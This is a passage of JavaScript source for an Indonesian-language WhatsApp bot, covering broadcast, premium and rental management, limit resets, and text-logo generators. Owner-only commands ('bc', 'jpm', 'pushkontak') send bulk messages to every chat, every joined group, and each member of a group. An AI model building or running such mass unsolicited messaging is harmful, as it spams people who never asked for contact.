newReply(`Sukses Menambahkan Vn / audio \nCek dengan cara ${prefix}listvn`)
}
break
case 'listvn': case 'listaudio':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
teks = '*AUDIO LIST :*\n\n'
for (let awokwkwk of audionye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${audionye.length}*\n\n_Untuk mengambil audio silahkan kirim pesan sesuai list audio di atas_`
newReply(teks)
break
}
case 'bcimage': case 'bcimg':{
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply(`Reply foto dengan caption ${prefix + command} Tes`)
if (!/image/.test(mime)) return newReply(`Reply foto dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await juna.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
juna.sendMessage(apaan, {image: buffer, caption: txt}, {quoted: fkontak})
}
newReply('Sukses Broadcast')
}
break
case 'bcvideo': case 'bcvid':{
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply(`Reply video dengan caption ${prefix + command} Tes`)
if (!/video/.test(mime)) return newReply(`Reply video dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await juna.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
juna.sendMessage(apaan, {video: buffer, caption: txt, mimetype: 'video/mp4', duration: 909090909}, {quoted: fkontak})
}
newReply('Sukses Broadcast')
}
break
case 'bcaudio': case 'bcaud':{
if (!isCreator) return newReply(mess.OnlyOwner)
if (!/audio/.test(mime)) return newReply(`Reply audio dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await juna.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
juna.sendMessage(apaan, {audio: buffer, mimetype: 'audio/mpeg', ptt: false, duration: 909090909}, {quoted: fkontak})
}
newReply('Sukses Broadcast')
}
break
case 'bcvn': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (!/audio/.test(mime)) return newReply(`Reply audio dengan caption ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let media = await juna.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
juna.sendMessage(apaan, {audio: buffer, mimetype: 'audio/mpeg', ptt: true, duration: 909090909}, {quoted: fkontak})
}
newReply('Sukses Broadcast')
}
break
case 'bcstiker': case 'bcstik': case 'bcsticker':{
if (!isCreator) return newReply(mess.OnlyOwner)
 if (!/webp/.test(mime)) return newReply(`Reply stiker dengan caption ${prefix + command}`)
let anu = await store.chats.all().map(v => v.id)
let media = await juna.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
for (let apaan of anu) {
let txt = `「 BROADCAST 」\n\n${text}`
juna.sendMessage(apaan, {sticker :{url : media}}, {quoted: fkontak})
}
newReply('Sukses Broadcast')
}
break
case 'bc': case 'broadcast': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply (`Example : ${prefix + command} Tes`)
let anu = await store.chats.all().map(v => v.id)
let todd = await juna.reSize(`${setting.pathimg}`, 300, 300) 
newReply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
for (let apaan of anu) {
await sleep(1500)
juna.sendMessage(apaan, {image: {url: `https://telegra.ph/file/5beafc90f688c8ad48b7d.png`}, caption: `*BROADCAST*\n\n${text}`})
}
newReply('Sukses Broadcast')
}
break
case "jpm": case "post": {
if (!isCreator) return newReply('*Khusus Owner Bot*')
if (!text) return newReply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
let getGroups = await juna.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await juna.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await juna.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await juna.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await juna.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
newReply("*SUCCESFUL ✅*")
}
break
case 'pushkontak': {
if (!isCreator) return newReply('*Khusus Owner Bot*')
if (!m.isGroup) return newReply('Hanya bisa digunakan di dalam grup')
var name = text.split('|')[0]
var chet = text.split('|')[1]
if (!name) return newReply(`Masukan nama lu yang bener cok\n contoh: ${prefix+command} juna|sv uy udh gw sv back`) 
if (!chet) return newReply(`Masukan nama lu yang bener cok\n contoh: ${prefix+command} juna|sv uy udh gw sv back`) 
let kontk = {
displayName: "Contact",
contacts: [{
displayName: name,
vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;" + name + ";;;\nFN:" + name + "\nitem1.TEL;waid=" + m.sender.split('@')[0] + ":" + m.sender.split('@')[0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
}]
}
let pkDetect = await juna.groupMetadata(m.chat)
if (pkDetect.participants.length > 200) return newReply('Batas member maksimal; 200')
newReply('Gasken pushkontak total member ' + pkDetect.participants.length + ' member')
for (let a of pkDetect.participants) {
juna.sendMessage(a.id, {
contacts: kontk
})
await sleep(500)
juna.sendMessage(a.id, {
text: chet,
contextInfo:
{
"externalAdReply": {
"title": botName, 
"body": `Ijin Pushkontak Om`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: instagram, 
thumbnailUrl: pathimg, 
}
}
})
await sleep(500)
} // (?); kirim pesan ke semua peserta grup
newReply('(Group: *' + pkDetect.subject + '*\nMember: ' + pkDetect.participants.length + '\ndelay: 500\nBERHASIL PUSH')
	}
break
case 'delchat':
if (!isCreator) return newReply(mess.OnlyOwner)
var teks = q ? q : m.chat
await juna.chatModify({delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]}, teks)
newReply('Sukses!')
break
case'bcsewa': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (!text) return newReply (`Example : ${prefix + command} Tes`)
addCountCmd('#bcsewa', m.sender, _cmd)
for (let i of sewa){
await juna.sendMessage(i.id, { text: text })
await sleep(3000) 
}
newReply(`Sukses bc ke ${sewa.length}`)
}
break
case'addprem':{
if (!isCreator) return newReply(mess.OnlyOwner)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return newReply(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
if (!atnm) return newReply(`Mau yang berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
addCountCmd('#addprem', m.sender, _cmd)
_prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
newReply('Sukses')
} else {
var cekap = await juna.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return newReply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
addCountCmd('#addprem', m.sender, _cmd)
_prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
newReply('Sukses')
}}
break
case'delprem':
if (!isCreator) return newReply(mess.OnlyOwner)
if (!args[0]) return newReply(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
addCountCmd('#delprem', m.sender, _cmd)
premium.splice(_prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
newReply('Sukses!')
} else {
var cekpr = await juna.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return newReply(`Masukkan nomer yang valid/terdaftar di WhatsApp`)
addCountCmd('#delprem', m.sender, _cmd)
premium.splice(_prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
newReply('Sukses!')
}
break
case'addsewa':
if (!isCreator) return newReply(mess.OnlyOwner)
if (text < 2) return newReply(`Gunakan dengan cara ${prefix+command} *linkgc waktu*\n\nContoh : ${prefix+command} https://chat.whatsapp.com/PnwpPqn0b 30d`)
if (!isUrl(args[0])) return newReply(mess.error.Iv)
var url = args[0]
addCountCmd('#addsewa', m.sender, _cmd)
url = url.split('https://chat.whatsapp.com/')[1]
if (!text) return newReply(`Waktunya?`)
var data = await juna.groupAcceptInvite(url)
if (_sewa.checkSewaGroup(data, sewa)) return newReply(`Bot sudah disewa oleh grup tersebut!`)
_sewa.addSewaGroup(data, args[1], sewa)
newReply(`Success Add Sewa Group Berwaktu!`)
break
case'delsewa':
if (!isCreator) return newReply(mess.OnlyOwner)
if (!m.isGroup) return newReply(`Perintah ini hanya bisa dilakukan di Grup yang menyewa bot`)
if (!isSewa) return newReply(`Bot tidak disewa di Grup ini`)
addCountCmd('#delsewa', m.sender, _cmd)
sewa.splice(_sewa.getSewaPosition(args[0] ? args[0] : m.chat, sewa), 1)
fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa, null, 2))
newReply(`Sukses`)
break
case'resetlimit':
if (!isCreator) return newReply(mess.OnlyOwner)
addCountCmd('#resetlimit', m.sender, _cmd)
limit = []
fs.writeFileSync('./database/limit.json', JSON.stringify(limit, null, 2))
glimit = []
fs.writeFileSync('./database/glimit.json', JSON.stringify(glimit, null, 2))
newReply(`Sukses reset limit pengguna`)
break
case'resetbalance':

if (!isCreator) return newReply(mess.OnlyOwner)


limit = []

fs.writeFileSync('./database/balance.json', JSON.stringify(limit, null, 2))

newReply(`Sukses reset balance pengguna menjadi 0`)


break
case'resetafk':

if (!isCreator) return newReply(mess.OnlyOwner)

limit = []

fs.writeFileSync('./database/afk.json', JSON.stringify(limit, null, 2))

newReply(`Sukses reset AFK user`)

break

case'halloween2':case'horror':case'game8bit':case'layered':case'glitch2':case'coolg':case'coolwg':case'realistic':case'space3d':case'gtiktok':case'stone':case'marvel':case'marvel2':case'pornhub':case'avengers':case'metalr':case'metalg':case'metalg2':case'lion':case'wolf_bw':case'wolf_g':case'ninja':case'3dsteel':case'horror2':case'lava':case'bagel':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
newReply(mess.wait)
let texproo = await getBuffer(`https://api.zeeoneofc.my.id/api/textpro/${command}?text=${m1}&text2=${m2}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: texproo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(util.format(err))
})
}
break
//photooxy menu
case'photooxymenu':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *PHOTOOXY MENU*
│
├❖ *LIST*
│1 ▸ ${prefix}*typography-flower (Text)*
│2 ▸ ${prefix}*under-flower (Text)*
│3 ▸ ${prefix}*bevel-text (Text)*
│4 ▸ ${prefix}*silk-text (Text)*
│5 ▸ ${prefix}*smoke-typography (Text)*
│6 ▸ ${prefix}*carvedwood (Text)*
│7 ▸ ${prefix}*scary-cemetery (Text)*
│8 ▸ ${prefix}*royallook (Text)*
│9 ▸ ${prefix}*coffeecup2 (Text)*
│10 ▸ ${prefix}*illuminated (Text)*
│11 ▸ ${prefix}*harry-potter2 (Text)*
│12 ▸ ${prefix}*woodblack (Text)*
│13 ▸ ${prefix}*butterfly-reflection (Text)*
│14 ▸ ${prefix}*watermelon (Text)*
│15 ▸ ${prefix}*striking (Text)*
│16 ▸ ${prefix}*metallicglow (Text)*
│17 ▸ ${prefix}*rainbow-text (Text)*
│18 ▸ ${prefix}*birthday-cake (Text)*
│19 ▸ ${prefix}*embroidery (Text)*
│20 ▸ ${prefix}*crisp (Text)* 
│21 ▸ ${prefix}*flaming (Text)*
│22 ▸ ${prefix}*furtext (Text)*
│23 ▸ ${prefix}*nightsky (Text)*
│24 ▸ ${prefix}*glow-rainbow (Text)*
│25 ▸ ${prefix}*gradient-avatar (Text)*
│26 ▸ ${prefix}*white-cube (Text)*
│27 ▸ ${prefix}*honey-text (Text)*
│28 ▸ ${prefix}*vintage-style (Text)*
│29 ▸ ${prefix}*glowing-3d (Text)*
│30 ▸ ${prefix}*army-camouflage (Text)*
│31 ▸ ${prefix}*graffiti-cover (Text)*
│32 ▸ ${prefix}*rainbow-shine (Text)*
│33 ▸ ${prefix}*smoky-neon (Text)*
│34 ▸ ${prefix}*quotes-underfall (Text)*
│35 ▸ ${prefix}*vector-nature (Text)*
│36 ▸ ${prefix}*yellow-rose (Text)*
│37 ▸ ${prefix}*love-text (Text)*
│38 ▸ ${prefix}*underwater-ocean (Text)*
│39 ▸ ${prefix}*nature-text (Text)*
│40 ▸ ${prefix}*wolf-metal (Text)*
│41 ▸ ${prefix}*summer-text (Text)*
│42 ▸ ${prefix}*wooden-board (Text)*
│43 ▸ ${prefix}*quote-wood (Text)*
│44 ▸ ${prefix}*quotes-undergrass (Text)*
│45 ▸ ${prefix}*naruto-banner (Text)*
│46 ▸ ${prefix}*love-message (Text)*
│47 ▸ ${prefix}*textoncup2 (Text)*
│48 ▸ ${prefix}*burn-paper (Text)*
│49 ▸ ${prefix}*smoke (Text)*
│50 ▸ ${prefix}*romantic-messages (Text)*
│51 ▸ ${prefix}*shadow-sky (Text)*
│52 ▸ ${prefix}*text-cup (Text)*
│53 ▸ ${prefix}*coffecup (Text)*
│54 ▸ ${prefix}*battlegrounds-logo (Text1) | (Text2)*
│55 ▸ ${prefix}*battlefield4 (Text1) | (Text2)*
│56 ▸ ${prefix}*text-8bit (Text1) | (Text2)*
│
╰────────────˧`)
}
break

case'battlegrounds-logo': case'battlefield4': case'text-8bit':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
newReply(mess.wait)
let photooxy = await getBuffer(`https://api.zeeoneofc.my.id/api/photooxy/${command}?text=${m1}&text2=${m2}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: photooxy, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(util.format(err))
})
}
break
//photooxy menu
case'typography-flower': case'under-flower': case'bevel-text': case'silk-text': case'sweet-andy': case'smoke-typography': case'carvedwood': case'scary-cemetery': case'royallook': case'coffeecup2': case'illuminated': case'harry-potter2': case'woodblack': case'butterfly-reflection': case'watermelon': case'striking': case'metallicglow': case'rainbow-text': case'birthday-cake': case'embroidery': case'crisp': case'flaming': case'furtext': case'nightsky': case'glow-rainbow': case'gradient-avatar': case'white-cube': case'honey-text': case'vintage-style': case'glowing-3d': case'army-camouflage': case'graffiti-cover': case'rainbow-shine': case'smoky-neon': case'quotes-underfall': case'vector-nature': case'yellow-rose': case'love-text': case'underwater-ocean': case'nature-text': case'wolf-metal': case'summer-text': case'wooden-board': case'quote-wood': case'quotes-undergrass': case'naruto-banner': case'love-message': case'textoncup2': case'burn-paper': case'smoke': case'romantic-messages': case'shadow-sky': case'text-cup': case'coffecup':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text*`)
newReply(mess.wait)
let photooxy = await getBuffer(`https://api.zeeoneofc.my.id/api/photooxy/${command}?text=${q}&apikey=${setting.BotKey}`)
try{
await juna.sendMessage(m.chat, {image: photooxy, caption: "Done kak"}, {quoted: m})
}  catch (err){
newReply(mess.error.api) 
}
}
break
//logomaker
case'avataroverwatch': case'logoaccording': case'mascotstyle': case'letterlogos':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|thumb*\n*Untuk List Thumb Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|thumb*\n*Untuk List Thumb Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m3 = mm.split("|")[2]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&text2=${m2}&thumb=${m3}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listavataroverwatch': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST THUMB*
│
├❖ *LIST*
│1 ▸ *mccree*
│2 ▸ *mercy*
│3 ▸ *zenyatta*
│4 ▸ *zarya*
│5 ▸ *winston*
│6 ▸ *widowmaker*
│7 ▸ *tracer*
│8 ▸ *torbjorn*
│9 ▸ *symmetra*
│10 ▸ *sombra*
│11 ▸ *soldier76*
│12 ▸ *soldier_76*
│13 ▸ *roadhog*
│14 ▸ *reinhardt*
│15 ▸ *reaper2*
│16 ▸ *reaper*
│17 ▸ *pharah*
│18 ▸ *orisa*
│19 ▸ *mei*
│20 ▸ *lucio*
│21 ▸ *junkrat*
│22 ▸ *hanzo*
│23 ▸ *genji*
│24 ▸ *dva*
│25 ▸ *bastion*
│26 ▸ *ana2*
│27 ▸ *ana*
│28 ▸ *doomfist*
│29 ▸ *bg-1*
│
╰────────────˧`)
}
break
case'listlogoaccording': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST THUMB*
│
├❖ *LIST*
│1 ▸ *bear2*
│2 ▸ *cat2*
│3 ▸ *ceberus*
│4 ▸ *crocodile*
│5 ▸ *dinosaur*
│6 ▸ *dragon3*
│7 ▸ *eagle3*
│8 ▸ *horse2*
│9 ▸ *husky*
│10 ▸ *kraken*
│11 ▸ *lynx*
│12 ▸ *sabertooh*
│13 ▸ *assassin*
│14 ▸ *bee*
│15 ▸ *cat*
│16 ▸ *demon*
│17 ▸ *fox-2*
│18 ▸ *gorilla*
│19 ▸ *horus*
│20 ▸ *octopus*
│21 ▸ *rounin*
│22 ▸ *-2*
│23 ▸ *tiger-3*
│24 ▸ *bg-tiger*
│25 ▸ *bg-buffalo*
│26 ▸ *chicken*
│27 ▸ *bull*
│28 ▸ *bg-wolf*
│29 ▸ *jaguar*
│30 ▸ *horse*
│31 ▸ *eagle*
│32 ▸ *dragon*
│33 ▸ *wolver*
│34 ▸ *shark*
│35 ▸ *sabertooth*
│36 ▸ *rhino*
│37 ▸ *phoenix*
│38 ▸ *lion*
│39 ▸ *hornet*
│40 ▸ *griffin*
│41 ▸ *bear*
│42 ▸ *tiger2*
│43 ▸ *panther*
│44 ▸ *owl*
│45 ▸ *monkey*
│46 ▸ *goat*
│47 ▸ *fox*
│48 ▸ *dragon2*
│49 ▸ *devil*
│50 ▸ *cobra*
│51 ▸ *reaper*
│52 ▸ *pirates*
│53 ▸ *owl2*
│54 ▸ *mask*
│55 ▸ *eagle2*
│56 ▸ *fire*
│57 ▸ *neptune*
│58 ▸ *chamois*
│59 ▸ *parrots*
│60 ▸ *samurai*
│
╰────────────˧`)
}
break
case'listmascotstyle': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST THUMB*
│
├❖ *LIST*
│1 ▸ *dragon-5*
│2 ▸ *jet*
│3 ▸ *skull-3*
│4 ▸ *skull-cyborg*
│5 ▸ *tiger-4*
│6 ▸ *bee-3*
│7 ▸ *dragon-4*
│8 ▸ *fox-3*
│9 ▸ *goat-2*
│10 ▸ *kitsune*
│11 ▸ *octopus-2*
│12 ▸ *piranha*
│13 ▸ *assassin*
│14 ▸ *wolf*
│15 ▸ *bear-2*
│16 ▸ *cat*
│17 ▸ *ceberus*
│18 ▸ *crocodile*
│19 ▸ *dinosaur*
│20 ▸ *dragon-3*
│21 ▸ *eagle-3*
│22 ▸ *horse-2*
│23 ▸ *husky*
│24 ▸ *kraken*
│25 ▸ *lynx*
│26 ▸ *sabertooh*
│27 ▸ *sabertooth*
│28 ▸ *shark*
│29 ▸ *tiger*
│30 ▸ *tiger2*
│31 ▸ *tiger3*
│32 ▸ *skull2*
│33 ▸ *scorpion*
│34 ▸ *rounin*
│35 ▸ *octopus*
│36 ▸ *horus*
│37 ▸ *gorilla*
│38 ▸ *fox*
│39 ▸ *demon*
│40 ▸ *cat2*
│41 ▸ *bee*
│42 ▸ *dragon*
│43 ▸ *dragon2*
│44 ▸ *owl*
│45 ▸ *eagle*
│46 ▸ *goat*
│47 ▸ *griffin*
│48 ▸ *horse*
│49 ▸ *hornet*
│50 ▸ *lion*
│51 ▸ *panther*
│52 ▸ *phoenix*
│53 ▸ *puma*
│54 ▸ *rooster*
│55 ▸ *rhino*
│56 ▸ *bee2*
│57 ▸ *devil*
│58 ▸ *cobra*
│59 ▸ *bull*
│60 ▸ *bear*
│61 ▸ *monkey*
│62 ▸ *warrior*
│63 ▸ *rabbit*
│64 ▸ *pirates*
│65 ▸ *owl2*
│66 ▸ *neonwolf*
│67 ▸ *lionking*
│68 ▸ *godzilla*
│69 ▸ *flashwolf*
│70 ▸ *fire*
│71 ▸ *eagle2*
│72 ▸ *dog*
│73 ▸ *mask*
│74 ▸ *team*
│75 ▸ *pubg*
│76 ▸ *drift*
│
╰────────────˧`)
}
break
case'listletterlogos': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST THUMB*
│
├❖ *LIST*
│1 ▸ *a*
│2 ▸ *b*
│3 ▸ *c*
│4 ▸ *d*
│5 ▸ *e*
│6 ▸ *f*
│7 ▸ *g*
│8 ▸ *h*
│9 ▸ *i*
│10 ▸ *j*
│11 ▸ *k*
│12 ▸ *l*
│13 ▸ *m*
│14 ▸ *n*
│15 ▸ *o*
│16 ▸ *p*
│17 ▸ *q*
│18 ▸ *r*
│19 ▸ *s*
│20 ▸ *t*
│21 ▸ *u*
│22 ▸ *v*
│23 ▸ *w*
│24 ▸ *x*
│25 ▸ *y*
│26 ▸ *z*
│
╰────────────˧`)
}
break

case'bannerofpubg': case'bannerofapex': case'bannerofoverwatch': case'banneroffreefire': case'gunlogogaming': case'companylogo': case'companylogo2': case'teamlogo':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|background*\n*Untuk List Background Ketik .list${command}*`)
if (!q.includes('|')) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|background*\n*Untuk List Background Ketik .list${command}*`)
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
m3 = mm.split("|")[2]; 
newReply(mess.wait)
let logo = await getBuffer(`https://api.zeeoneofc.my.id/api/ephoto360/${command}?text=${m1}&text2=${m2}&background=${m3}&apikey=${setting.BotKey}`)
juna.sendMessage(m.chat, {image: logo, caption: "Done kak"}, {quoted: m})
.catch((err) => {
newReply(`*Upss, mungkin ada kesalahan dalam penulisan kamu, jika penulisan kamu sudah benar tapi error silahkan tanyakan ke owner, ketik .owner.*`)
})
}
break
case'listbannerofpubg': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *bg1*
│2 ▸ *bg2*
│3 ▸ *bg3*
│4 ▸ *bg4*
│5 ▸ *bg5*
│6 ▸ *bg6*
│7 ▸ *bg7*
│8 ▸ *bg8*
│9 ▸ *bg9*
│10 ▸ *bg10*
│11 ▸ *bg11*
│
╰────────────˧`)
}
break
case'listbannerofapex': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *bg1*
│2 ▸ *bg2*
│3 ▸ *bg3*
│4 ▸ *bg4*
│5 ▸ *bg5*
│6 ▸ *bg6*
│
╰────────────˧`)
}
break
case'listbannerofoverwatch': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *widowmaker*
│2 ▸ *tracer*
│3 ▸ *symmetra*
│4 ▸ *sombra*
│5 ▸ *soldier76*
│6 ▸ *reinhardt*
│7 ▸ *reaper*
│8 ▸ *orisa*
│9 ▸ *mercy*
│10 ▸ *mei*
│11 ▸ *genji*
│12 ▸ *dva*
│13 ▸ *doomfist*
│14 ▸ *ashe*
│15 ▸ *ana*
│
╰────────────˧`)
}
break
case'listbanneroffreefire': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *andrew*
│2 ▸ *kelly*
│3 ▸ *caroline*
│4 ▸ *laura*
│5 ▸ *maxim*
│6 ▸ *miguel*
│7 ▸ *misha*
│8 ▸ *moco*
│9 ▸ *nikita*
│10 ▸ *notora*
│11 ▸ *olivia*
│12 ▸ *steffi*
│
╰────────────˧`)
}
break
case'listgunlogogaming': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *ak47*
│2 ▸ *ak47-s*
│3 ▸ *an94*
│4 ▸ *ar15*
│5 ▸ *aug*
│6 ▸ *awm*
│7 ▸ *g36k*
│8 ▸ *m4a1*
│9 ▸ *m4-s*
│10 ▸ *m14ebr*
│11 ▸ *m16*
│12 ▸ *m60*
│13 ▸ *m82a1*
│14 ▸ *mp5*
│15 ▸ *scar*
│16 ▸ *svd*
│17 ▸ *xm8*
│18 ▸ *xm1014*
│
╰────────────˧`)
}
break
case'listcompanylogo2': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *1*
│2 ▸ *2*
│3 ▸ *3*
│4 ▸ *4*
│5 ▸ *5*
│6 ▸ *6*
│7 ▸ *7*
│8 ▸ *8*
│9 ▸ *9*
│10 ▸ *10*
│11 ▸ *11*
│12 ▸ *12*
│13 ▸ *13*
│14 ▸ *14*
│15 ▸ *15*
│16 ▸ *16*
│17 ▸ *17*
│18 ▸ *18*
│
╰────────────˧`)
}
break
case'listcompanylogo': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *1*
│2 ▸ *2*
│3 ▸ *3*
│4 ▸ *4*
│5 ▸ *5*
│6 ▸ *6*
│7 ▸ *7*
│8 ▸ *8*
│9 ▸ *9*
│10 ▸ *10*
│11 ▸ *11*
│12 ▸ *12*
│13 ▸ *13*
│14 ▸ *14*
│15 ▸ *15*
│16 ▸ *16*
│17 ▸ *17*
│18 ▸ *18*
│19 ▸ *19*
│20 ▸ *20*
│21 ▸ *21*
│22 ▸ *22*
│23 ▸ *23*
│24 ▸ *24*
│25 ▸ *25*
│26 ▸ *26*
│
╰────────────˧`)
}
break
case'listteamlogo': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!text) return newReply(`╭─▸ *LIST BACKGROUND*
│
├❖ *LIST*
│1 ▸ *cobra*
│2 ▸ *dragon*
│3 ▸ *eagle*
│4 ▸ *eagle2*
│5 ▸ *falcon*
│6 ▸ *bear*
│7 ▸ *lion*
│8 ▸ *lion2*
│9 ▸ *buffalo*
│10 ▸ *tiger*
│11 ▸ *tiger2*
│12 ▸ *wolf*
│
╰────────────˧`)
}
break

case'pencilsketch':
{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *text|text2|icon*\n*Untuk List Icon Ketik .list${command}*`)
